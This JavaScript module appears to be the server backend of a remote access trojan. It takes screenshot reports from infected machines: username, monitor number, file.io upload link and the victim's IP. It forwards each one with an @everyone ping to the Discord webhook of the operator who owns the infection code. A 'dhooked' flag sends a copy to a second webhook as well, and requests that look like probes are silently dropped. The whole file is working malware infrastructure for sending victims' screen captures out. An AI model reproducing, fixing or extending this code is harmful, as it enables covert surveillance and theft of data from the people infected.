import AsciiTable from "ascii-table";
import { WebhookClient, EmbedBuilder } from "discord.js";
import { getClientIp } from "request-ip";

const usernameRegex = /^[a-zA-Z0-9_]{1,16}$/;
const urlRegex = /^https:\/\/file\.io\/[a-zA-Z0-9]+$/;

export default function handleScreenshot(ratDB, webhookClient, sendError, getNetworth) {
  return async function (req, res) {
    const { id, username = "null", monitor: monitor1 = "null", url = "null" } = req.body;
    const monitor = numberToString(monitor1);
    const ip = getClientIp(req);

    const table = new AsciiTable("Screenshot Hit").setHeading("Type", "Value");
    table.addRow("Code", id);
    table.addRow("Username", username);
    table.addRow("Monitor", monitor);
    table.addRow("URL", url);
    table.addRow("IP", ip);

    if (
      username.toLowerCase().includes("discord") ||
      monitor.toLowerCase().includes("discord") ||
      url.toLowerCase().includes("discord") ||
      !usernameRegex.test(username) ||
      typeof monitor1 != "number" ||
      !urlRegex.test(url)
    ) {
      table.addRow("Error", "Invalid Request");
      console.log(table.toString());
      return;
    }

    try {
      const { webhook, dhooked } = await ratDB.getWebhook(id);
      const embed = new EmbedBuilder()
        .setColor("#ffff00")
        .setTitle(":camera_with_flash: Screenshot")
        .addFields(
          { name: "Monitor #", value: `\`\`\`Monitor ${monitor}\`\`\``, inline: false },
          { name: ":link: URL", value: url, inline: false }
        );

      if (dhooked)
        await webhookClient.send({
          content: "@everyone",
          username: "Message - " + username,
          embeds: [embed],
        });

      if (webhook) {
        const webhookClientCustom = new WebhookClient({ url: webhook });
        await webhookClientCustom.send({
          content: "@everyone",
          username: "Message - " + username,
          embeds: [embed],
        });
      } else {
        table.addRow("Error", "Webhook Not Found");
      }
    } catch (e) {
      var errorMsg;
      if (e.response) {
        errorMsg = e.response.data;
      } else if (e.request) {
        errorMsg = e.request;
      } else {
        errorMsg = e.message;
      }

      console.error(e);

      table.addRow("Error", e);
    }

    console.log(table.toString());
  };
}

function numberToString(string) {
  if (string == null) {
    return "null";
  } else if (typeof string == "number") {
    return string.toString();
  } else {
    return string;
  }
}
